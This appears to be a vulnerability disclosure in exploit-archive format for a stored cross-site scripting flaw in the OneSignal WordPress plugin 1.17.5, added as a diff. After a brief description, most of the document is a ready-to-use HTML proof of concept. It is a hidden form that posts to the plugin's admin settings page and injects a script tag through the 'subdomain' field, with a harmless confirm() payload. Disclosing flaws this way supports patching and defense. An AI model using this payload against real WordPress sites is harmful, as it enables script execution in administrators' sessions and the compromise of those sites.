@@ -1,0 +1,102 @@
+# Exploit Title: WordPress Plugin OneSignal 1.17.5 - Persistent Cross-Site Scripting
+# Date: 2019-07-18
+# Vendor Homepage: https://www.onesignal.com
+# Software Link:  https://wordpress.org/plugins/onesignal-free-web-push-notifications/
+# Affected version: 1.17.5
+# Exploit Author: LiquidWorm
+# Tested on: Linux
+
+Summary: OneSignal is a high volume and reliable push notification service
+for websites and mobile applications. We support all major native and mobile
+platforms by providing dedicated SDKs for each platform, a RESTful server API,
+and an online dashboard for marketers to design and send push notifications.
+
+Desc: The application suffers from an authenticated stored XSS via POST request.
+The issue is triggered when input passed via the POST parameter 'subdomain' is
+not properly sanitized before being returned to the user. This can be exploited
+to execute arbitrary HTML and script code in a user's browser session in context
+of an affected site.
+
+Tested on: WordPress 5.2.2
+           Apache/2.4.39
+           PHP/7.1.30
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5530
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5530.php
+
+<html>
+  <body>
+  <script>history.pushState('', 'SHPA', '/')</script>
+    <form action="http://127.0.0.1/wp-admin/admin.php?page=onesignal-push" method="POST">
+      <input type="hidden" name="onesignal_config_page_nonce" value="f7fae30a4f" />
+      <input type="hidden" name="_wp_http_referer" value="/wp-admin/admin.php?page=onesignal-push" />
+      <input type="hidden" name="app_id" value="14d99ab2-fc9d-1337-bc16-a8a6df479515" />
+      <input type="hidden" name="app_rest_api_key" value="M2IzZDA4MzItOGJmOS00YjRkLWE4YzEtZSLmMjllNjlkYmZl" />
+      <input type="hidden" name="subdomain" value=""><script>confirm(251)</script>" />
+      <input type="hidden" name="safari_web_id" value="" />
+      <input type="hidden" name="showNotificationIconFromPostThumbnail" value="true" />
+      <input type="hidden" name="showNotificationImageFromPostThumbnail" value="true" />
+      <input type="hidden" name="persist_notifications" value="platform-default" />
+      <input type="hidden" name="notification_title" value="hACKME" />
+      <input type="hidden" name="notifyButton_enable" value="true" />
+      <input type="hidden" name="notifyButton_showAfterSubscribed" value="true" />
+      <input type="hidden" name="notifyButton_prenotify" value="true" />
+      <input type="hidden" name="notifyButton_showcredit" value="true" />
+      <input type="hidden" name="notifyButton_customize_enable" value="true" />
+      <input type="hidden" name="notifyButton_size" value="medium" />
+      <input type="hidden" name="notifyButton_position" value="bottom-right" />
+      <input type="hidden" name="notifyButton_theme" value="default" />
+      <input type="hidden" name="notifyButton_offset_bottom" value="" />
+      <input type="hidden" name="notifyButton_offset_left" value="" />
+      <input type="hidden" name="notifyButton_offset_right" value="" />
+      <input type="hidden" name="notifyButton_color_background" value="" />
+      <input type="hidden" name="notifyButton_color_foreground" value="" />
+      <input type="hidden" name="notifyButton_color_badge_background" value="" />
+      <input type="hidden" name="notifyButton_color_badge_foreground" value="" />
+      <input type="hidden" name="notifyButton_color_badge_border" value="" />
+      <input type="hidden" name="notifyButton_color_pulse" value="" />
+      <input type="hidden" name="notifyButton_color_popup_button_background" value="" />
+      <input type="hidden" name="notifyButton_color_popup_button_background_hover" value="" />
+      <input type="hidden" name="notifyButton_color_popup_button_background_active" value="" />
+      <input type="hidden" name="notifyButton_color_popup_button_color" value="" />
+      <input type="hidden" name="notifyButton_message_prenotify" value="" />
+      <input type="hidden" name="notifyButton_tip_state_unsubscribed" value="" />
+      <input type="hidden" name="notifyButton_tip_state_subscribed" value="" />
+      <input type="hidden" name="notifyButton_tip_state_blocked" value="" />
+      <input type="hidden" name="notifyButton_message_action_subscribed" value="" />
+      <input type="hidden" name="notifyButton_message_action_resubscribed" value="" />
+      <input type="hidden" name="notifyButton_message_action_unsubscribed" value="" />
+      <input type="hidden" name="notifyButton_dialog_main_title" value="" />
+      <input type="hidden" name="notifyButton_dialog_main_button_subscribe" value="" />
+      <input type="hidden" name="notifyButton_dialog_main_button_unsubscribe" value="" />
+      <input type="hidden" name="notifyButton_dialog_blocked_title" value="" />
+      <input type="hidden" name="notifyButton_dialog_blocked_message" value="" />
+      <input type="hidden" name="prompt_customize_enable" value="true" />
+      <input type="hidden" name="prompt_action_message" value="" />
+      <input type="hidden" name="prompt_auto_accept_title" value="" />
+      <input type="hidden" name="prompt_site_name" value="" />
+      <input type="hidden" name="prompt_example_notification_title_desktop" value="" />
+      <input type="hidden" name="prompt_example_notification_message_desktop" value="" />
+      <input type="hidden" name="prompt_example_notification_title_mobile" value="" />
+      <input type="hidden" name="prompt_example_notification_message_mobile" value="" />
+      <input type="hidden" name="prompt_example_notification_caption" value="" />
+      <input type="hidden" name="prompt_accept_button_text" value="" />
+      <input type="hidden" name="prompt_cancel_button_text" value="" />
+      <input type="hidden" name="send_welcome_notification" value="true" />
+      <input type="hidden" name="welcome_notification_title" value="" />
+      <input type="hidden" name="welcome_notification_message" value="" />
+      <input type="hidden" name="welcome_notification_url" value="" />
+      <input type="hidden" name="notification_on_post" value="true" />
+      <input type="hidden" name="utm_additional_url_params" value="" />
+      <input type="hidden" name="allowed_custom_post_types" value="" />
+      <input type="hidden" name="custom_manifest_url" value="" />
+      <input type="hidden" name="show_notification_send_status_message" value="true" />
+      <input type="submit" value="Send" />
+    </form>
+  </body>
+</html>
